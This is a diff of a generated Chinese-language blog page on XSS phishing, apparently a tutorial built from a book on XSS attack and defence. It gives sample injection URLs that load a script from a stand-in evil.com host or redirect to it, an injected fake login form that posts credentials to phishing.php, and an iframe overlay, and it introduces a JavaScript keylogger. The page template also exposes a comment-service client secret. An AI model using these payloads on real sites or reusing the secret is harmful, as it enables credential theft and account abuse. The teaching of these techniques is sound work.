@@ -23,10 +23,10 @@
     
 
     
-    <link rel="canonical" href="http://localhost:4000/2018/10/10/Phishing/">
+    <link rel="canonical" href="http://localhost:4000/2018/10/10/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/">
     <link rel="alternate" type="application/atom+xml" title="Evil" href="http://localhost:4000/feed.xml">
     
-    <link rel="shortcut icon" href="http://localhost:4000/images/favicon.jpg" >
+    <link rel="shortcut icon" href="http://localhost:4000/images/favicon.ico" >
     
     <meta property="og:title" content="网络钓鱼">
       
@@ -40,7 +40,7 @@
     
         
     
-    <meta property="og:url" content="http://localhost:4000/2018/10/10/Phishing/">
+    <meta property="og:url" content="http://localhost:4000/2018/10/10/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/">
     <meta property="og:site_name" content="Evil">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
@@ -119,9 +119,87 @@
 
 <p>主要来自《XSS 攻击剖析与防御》</p>
 
-<h2 id="0x01-钓鱼页面">0x01 钓鱼页面</h2>
+<h2 id="0x01-xss-phishing">0x01 XSS Phishing</h2>
 
-<h2 id="0x0-javascript-键盘记录器">0x0 JavaScript 键盘记录器</h2>
+<h3 id="1钓鱼页面">1.钓鱼页面</h3>
+
+<p>构造钓鱼页面，然后修改钓鱼页面的地址，也就是修改表单的 <code class="highlighter-rouge">action</code> 的值</p>
+
+<h3 id="2记录信息的脚本">2.记录信息的脚本</h3>
+
+<p>在远程服务器上存放一个接收信息的文件</p>
+
+<h3 id="3xss-phishing-exploit">3.XSS Phishing Exploit</h3>
+
+<p>攻击者在存在 XSS 的页面插入利用代码</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.bug.com/index.php?s=&lt;script src=http://www.evil.com/xss.js&gt;&lt;/script&gt;
+</code></pre></div></div>
+
+<p>当用户访问这个链接时，就会动态调用远程的 xss.js 文件，该文件的作用是创建一个 Iframe 框架覆盖目标页面，再加载远程域伪造的钓鱼页面（phishing.html）。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="p">(</span>
+		<span class="s1">'&lt;div style="position:absolute; top:0px; left:0px; width:100%; height:100%;"&gt;'</span> <span class="o">+</span>
+		<span class="s1">'&lt;iframe src=http://localhost:1111/test.html width=100% height=100%&gt;'</span> <span class="o">+</span>
+		<span class="s1">'&lt;/iframe&gt;&lt;/div&gt;'</span>
+			<span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="0x02-xss-钓鱼方式">0x02 XSS 钓鱼方式</h2>
+
+<h3 id="1xss重定向钓鱼-xss-redirect-phishing">1.XSS重定向钓鱼 (XSS Redirect Phishing)</h3>
+
+<p><strong>Exploit：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.bug.com/index.php?search="'&gt;&lt;script&gt;document.location.href="http://www.evil.com"&lt;/script&gt;
+</code></pre></div></div>
+
+<h3 id="2html-注入式钓鱼-xss-html-inject-phishing">2.HTML 注入式钓鱼 (XSS HTML Inject Phishing)</h3>
+
+<p>利用 XSS 漏洞直接将 HTML/JavaScript 代码插入到页面中</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.bug.com/index.php?search=[Exploit]
+</code></pre></div></div>
+
+<p>payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.bug.com/index.php?search="'
+<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>login<span class="nt">&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div</span> <span class="na">style=</span><span class="s">"text-align: center;"</span><span class="nt">&gt;&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"phishing.php"</span> <span class="na">name=</span><span class="s">"form"</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>Login:<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">"login"</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>Password:<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">"Password"</span> <span class="na">type=</span><span class="s">"password"</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">"Valid"</span> <span class="na">value=</span><span class="s">"Ok"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>这段代码会在正常的页面中嵌入一个 Form 表单，该表单会覆盖原页面显示，强迫用户输入账号和密码等信息。</p>
+
+<h3 id="3xss-跨框架钓鱼-iframe-phishing">3.XSS 跨框架钓鱼 （Iframe Phishing）</h3>
+
+<p>这种方式是通过 <code class="highlighter-rouge">&lt;Iframe&gt;</code> 标签嵌入远程域的一个页面实施钓鱼，和 <code class="highlighter-rouge">1</code> 的例子有点像，此时主页面依然处在正常网站的域名下，因此具有很高的迷惑性。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.bug.com/index.php?search=[Exploit]
+</code></pre></div></div>
+
+<p>XSS Phishing Exploit:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.bug.com/index.php?search="'&lt;iframe src="http://www.evil.com" height="100%" width="100%"&gt;&lt;/iframe&gt;
+</code></pre></div></div>
+
+<p><strong>下面来看一个例子，以百度为例:</strong></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;head&gt;</span>
+		<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-type"</span> <span class="na">content=</span><span class="s">"text/html;charset=utf-8"</span><span class="nt">&gt;</span>
+		<span class="nt">&lt;title&gt;</span>百度一下，你就知道<span class="nt">&lt;/title&gt;</span>
+		<span class="nt">&lt;body</span> <span class="na">scroll=</span><span class="s">"no"</span><span class="nt">&gt;</span>
+			<span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"myFrame"</span> <span class="na">src=</span><span class="s">"http://www.baidu.com"</span> <span class="na">width=</span><span class="s">"100%"</span> <span class="na">height=</span><span class="s">"100%"</span> <span class="na">scrolling=</span><span class="s">"auto"</span> <span class="na">frameborder=</span><span class="s">"0"</span> <span class="na">onload=</span><span class="s">"this.style.height=document.body.clientHeight"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+		<span class="nt">&lt;/body&gt;</span>
+	<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h3 id="4flash-钓鱼flash-phishing">4.Flash 钓鱼（Flash Phishing）</h3>
+
+<p>Flash 钓鱼不要求网站存在 XSS 漏洞，只要攻击者把精心构造的 Flash 文件（比如一个假冒的登录框）上传到远程服务器，然后在目标网站中使用 <code class="highlighter-rouge">&lt;object&gt;</code> 或 <code class="highlighter-rouge">&lt;embed&gt;</code> 标签去引用 Flash 即可。</p>
+
+<h2 id="0x03-高级钓鱼技术">0x03 高级钓鱼技术</h2>
+<h3 id="1-javascript-键盘记录器">1. JavaScript 键盘记录器</h3>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--在 chrome 测试成功--&gt;</span>
 <span class="nt">&lt;html&gt;</span>
@@ -205,10 +283,10 @@
     <div class="newold">
   <hr>
   
-  <b>上一篇: <a href="/2018/10/10/event2/">JS 中的事件绑定、事件监听、事件委托</a></b><br>
+  <b>上一篇: <a href="/2018/10/10/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E6%81%AF%E5%88%BA%E6%8E%A2/">客户端信息刺探</a></b><br>
      
   
-  <b>下一篇: <a href="/2018/10/10/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E6%81%AF%E5%88%BA%E6%8E%A2/">客户端信息刺探</a></b>
+  <b>下一篇: <a href="/2018/10/11/webhacking.kr/">webhacking.kr writeup</a></b>
    
 </div><!--上一篇 下一篇-->
 
@@ -226,7 +304,7 @@
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/2018/10/10/Phishing/',
+            id: '/2018/10/10/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/',
             clientID: '5a59fdc570f933e0c2ee',
             clientSecret: '4bfb41f4315d6e67dc7d994890a4fc8bf9dee142',
             repo: 'blogcomments',
@@ -327,6 +405,7 @@ SimpleJekyllSearch({
                 
                 <li><a href="http://localhost:4000/feed.xml"><span class="octicon octicon-rss" style="color:orange;"></span></a></li>
             </ul>
+            <div id="zyzy"></div>
 
         </div>
     </footer>
@@ -370,5 +449,42 @@ SimpleJekyllSearch({
       </script>
     </div>
     
+    
 </body>
+<!--自言自语-->
+<script>
+    var xhr = new XMLHttpRequest();
+    var zyzy;
+    var arrayZyzy;
+    function getZyzy(){
+        var index1 = Math.floor(Math.random()*arrayZyzy.length);
+        var resText = "";
+        resText += "自言自语:\xa0「"+ arrayZyzy[index1] + "」";
+        zyzy.innerHTML = resText;
+    }
+    
+    xhr.onreadystatechange = function(){
+      // 通信成功时，状态值为4
+      if (xhr.readyState === 4){
+        if (xhr.status === 200){
+          console.log(xhr.responseText);
+          zyzy = document.getElementById("zyzy");
+          arrayZyzy = xhr.responseText.split("\n\n");
+
+          getZyzy();
+          setInterval("getZyzy()", 20000);
+
+        } else {
+          console.error(xhr.statusText);
+        }
+      }
+    };
+
+    xhr.onerror = function (e) {
+      console.error(xhr.statusText);
+    };
+
+    xhr.open('GET', '/zyzy.txt', true);
+    xhr.send(null);
+</script>
 </html>
